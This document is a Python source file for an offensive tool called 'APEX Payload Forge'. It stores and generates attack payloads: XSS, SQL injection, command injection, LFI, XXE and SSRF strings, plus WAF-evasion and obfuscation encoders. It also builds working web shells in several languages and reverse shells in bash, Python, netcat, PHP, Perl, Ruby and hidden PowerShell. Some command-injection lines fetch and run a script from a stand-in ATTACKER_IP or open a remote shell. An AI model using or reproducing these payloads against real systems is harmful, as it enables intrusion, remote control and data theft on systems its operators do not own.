"""
APEX v3.0 — Payload Forge
Generates, encodes, and obfuscates payloads for various attack vectors.
Supports XSS, SQLi, command injection, LFI, and more.
"""

import base64
import urllib.parse
import random
import string


class PayloadForge:
    """Payload generation and encoding engine."""

    def __init__(self):
        self.encoding_methods = [
            'base64', 'url', 'hex', 'html_entities', 'unicode_escape',
            'double_url', 'js_escape', 'xor_5', 'case_swap',
            'comment_inject', 'tab_inject'
        ]

        self.payload_templates = {
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "javascript:alert(1)",
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<input autofocus onfocus=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<select autofocus onfocus=alert(1)>',
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "' UNION SELECT NULL--",
                "' UNION SELECT username,password FROM users--",
                "1' AND 1=1--",
                "1' AND SLEEP(5)--",
                "' OR '1'='1' /*",
                "admin' OR '1'='1",
                "1; DROP TABLE users--",
            ],
            'cmdi': [
                '; ls -la',
                '| whoami',
                '`id`',
                '$(cat /etc/passwd)',
                '; cat /etc/passwd',
                '| nc -e /bin/sh ATTACKER_IP 4444',
                '; curl http://ATTACKER_IP/shell.sh | bash',
                '&& ping -c 3 ATTACKER_IP',
                '| nslookup $(whoami).ATTACKER_DOMAIN',
            ],
            'lfi': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '/etc/passwd',
                'php://filter/convert.base64-encode/resource=index.php',
                'php://input',
                'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==',
                'expect://id',
                '/proc/self/environ',
                '/var/log/apache2/access.log',
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/xxe.dtd">%xxe;]>',
            ],
            'ssrf': [
                'http://169.254.169.254/latest/meta-data/',
                'http://127.0.0.1:8080/admin',
                'http://localhost:6379/',
                'file:///etc/passwd',
                'gopher://127.0.0.1:25/_HELO',
            ],
        }

        self.web_shells = {
            'php': [
                {'filename': 'shell.php', 'content': '<?php system($_GET["cmd"]); ?>'},
                {'filename': 'shell.phtml', 'content': '<?php system($_GET["cmd"]); ?>'},
                {'filename': 'shell.php5', 'content': '<?php system($_GET["cmd"]); ?>'},
                {'filename': 'shell.php.jpg', 'content': '<?php system($_GET["cmd"]); ?>'},
            ],
            'asp': [
                {'filename': 'shell.asp', 'content': '<% Response.Write("APEX") %>'},
                {'filename': 'shell.aspx', 'content': '<%@ Page Language="C#" %><% Response.Write("APEX"); %>'},
                {'filename': 'shell.cer', 'content': '<% Response.Write("APEX") %>'},
            ],
            'jsp': [
                {'filename': 'shell.jsp', 'content': '<% out.println("APEX"); %>'},
                {'filename': 'shell.jspx', 'content': '<% out.println("APEX"); %>'},
            ],
        }

    def get_templates(self, vuln_type=None):
        """Return payload templates, optionally filtered by type."""
        if vuln_type and vuln_type in self.payload_templates:
            return {
                'type': vuln_type,
                'payloads': self.payload_templates[vuln_type],
                'count': len(self.payload_templates[vuln_type]),
            }
        return {
            'types': list(self.payload_templates.keys()),
            'total_templates': sum(len(v) for v in self.payload_templates.values()),
        }

    def encode_payload(self, payload, encoding):
        """Encode a payload using the specified method."""
        if encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'hex':
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif encoding == 'html_entities':
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding == 'unicode_escape':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'js_escape':
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif encoding == 'xor_5':
            return ''.join(chr(ord(c) ^ 5) for c in payload)
        elif encoding == 'case_swap':
            return ''.join(c.lower() if c.isupper() else c.upper() if c.islower() else c for c in payload)
        elif encoding == 'comment_inject':
            return payload.replace(' ', '/**/')
        elif encoding == 'tab_inject':
            return payload.replace(' ', '\t')
        else:
            return payload

    def generate_evasion_variants(self, payload, vuln_type, waf=None):
        """Generate WAF evasion variants of a payload."""
        variants = [payload]

        if vuln_type == 'xss':
            variants.extend([
                payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'),
                payload.replace('<script', '<script ').replace('>', ' >'),
                payload.replace('alert', '\\u0061lert'),
                payload.replace('alert', 'eval(String.fromCharCode(97,108,101,114,116))'),
                payload.replace('<', '%3C').replace('>', '%3E'),
                f'<img src=x onerror="{payload.replace("<script>","").replace("</script>","")}">',
            ])
        elif vuln_type == 'sqli':
            variants.extend([
                payload.replace(' ', '/**/'),
                payload.replace(' ', '+'),
                payload.replace('=', ' LIKE '),
                payload.replace("'", "\\'"),
                payload.replace('OR', '||'),
                payload.replace('AND', '&&'),
                payload.replace('UNION', 'UNI/**/ON'),
                payload.replace('SELECT', 'SEL/**/ECT'),
            ])
        elif vuln_type == 'cmdi':
            variants.extend([
                payload.replace(' ', '${IFS}'),
                payload.replace(';', '%0a'),
                payload.replace('|', '%7c'),
                payload.replace('cat', 'c\\at'),
                payload.replace('/', '${HOME:0:1}'),
                f'echo {base64.b64encode(payload.encode()).decode()} | base64 -d | sh',
            ])
        elif vuln_type == 'lfi':
            variants.extend([
                payload.replace('../', '....//'),
                payload.replace('../', '..\\/'),
                payload.replace('/', '%2f'),
                payload.replace('.', '%2e'),
                f'php://filter/convert.base64-encode/resource={payload}',
            ])

        return {
            'original': payload,
            'vuln_type': vuln_type,
            'waf': waf,
            'variants': variants,
            'count': len(variants),
        }

    def generate_web_shell(self, language='php', custom_cmd_param='cmd'):
        """Generate a web shell for the specified language."""
        shells = {
            'php': f'<?php system($_GET["{custom_cmd_param}"]); ?>',
            'asp': f'<% Dim cmd: cmd = Request("{custom_cmd_param}"): If cmd <> "" Then CreateObject("WScript.Shell").Exec("cmd /c " & cmd).StdOut.ReadAll() End If %>',
            'aspx': f'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["{custom_cmd_param}"]); %>',
            'jsp': f'<% Runtime.getRuntime().exec(request.getParameter("{custom_cmd_param}")); %>',
            'python': f'import os\nos.system(request.args.get("{custom_cmd_param}"))',
        }

        content = shells.get(language, shells['php'])
        return {
            'language': language,
            'filename': f'shell.{language}',
            'content': content,
            'usage': f'http://target.com/shell.{language}?{custom_cmd_param}=whoami',
        }

    def get_web_shells(self, language=None):
        """Return web shell templates."""
        if language and language in self.web_shells:
            return {
                'language': language,
                'shells': self.web_shells[language],
            }
        return {
            'languages': list(self.web_shells.keys()),
            'total_shells': sum(len(v) for v in self.web_shells.values()),
        }

    def generate_reverse_shell(self, ip, port, language='bash'):
        """Generate a reverse shell payload."""
        shells = {
            'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
            'python': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            'nc': f'nc -e /bin/sh {ip} {port}',
            'php': f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            'perl': f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
            'ruby': f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
        }

        content = shells.get(language, shells['bash'])
        return {
            'language': language,
            'ip': ip,
            'port': port,
            'payload': content,
        }

    def get_encoding_methods(self):
        """Return all available encoding methods."""
        return {
            'methods': self.encoding_methods,
            'total': len(self.encoding_methods),
        }


# Singleton instance
payload_forge = PayloadForge()